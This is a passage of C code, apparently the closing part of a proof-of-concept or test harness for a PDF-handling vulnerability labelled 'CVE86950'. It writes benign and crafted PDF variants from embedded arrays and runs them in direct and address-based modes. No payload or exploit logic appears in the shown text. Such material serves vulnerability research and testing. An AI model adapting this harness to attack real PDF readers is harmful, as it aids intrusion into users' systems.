    write_variant("benign.pdf", kTr7_benign, kTr7_benignLen);
    write_variant("n1.pdf", kTr7_n1, kTr7_n1Len);
    write_variant("plain.pdf", kTr7_plain, kTr7_plainLen);
    write_variant("plain9.pdf", kTr7_plain9, kTr7_plain9Len);

    const char *names[] = { "public.pdf", "small.pdf", "wide.pdf", "huge.pdf", "wideat0.pdf", "dx31.pdf", "dx33.pdf", "dx40.pdf", "x16k.pdf" };
    const char *stems[] = { "public", "small", "wide", "huge", "wideat0", "dx31", "dx33", "dx40", "x16k" };
    int only = -1;
    for (int v = 0; v < 5; v++)
        if (!__builtin_strncmp(stems[v], g_cfg_variant, 14)) only = v;
    run_cases();
    report("STAGE: mode=C direct");
    run_mode(2, "direct", "");
    report("STAGE: mode=D direct-by-address");
    run_mode(3, "direct-addr", "");
    ping_cfg("done");
    report("CVE86950 v13: all done");
    return 0;
}
